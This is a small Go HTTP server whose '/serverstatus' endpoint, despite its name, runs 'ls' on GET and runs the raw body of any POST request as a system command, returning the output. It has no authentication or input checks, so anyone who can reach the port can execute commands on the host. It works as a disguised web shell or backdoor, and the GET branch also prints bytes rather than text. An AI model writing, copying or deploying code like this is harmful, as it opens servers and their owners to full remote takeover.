package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strconv"
)

func main() {
	// Check if the user provided the port number
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run main.go [port]")
		return
	}

	port, err := strconv.Atoi(os.Args[1])
	if err != nil {
		fmt.Println("Invalid port number")
		return
	}

	http.HandleFunc("/serverstatus", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			if r.Method == "GET" {
            out, _ := exec.Command("ls").Output()
				fmt.Fprint(w, out)
			} else {
				http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
			}
			return
		}

		// Read the request body
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "Failed to read request body", http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		// Log the request body to the console
		fmt.Println(string(body))

		// Execute the script
		out, err := exec.Command(string(body)).Output()
		if err != nil {
			http.Error(w, "Failed to run script", http.StatusInternalServerError)
			return
		}
		fmt.Fprint(w, string(out))
	})

	http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
}
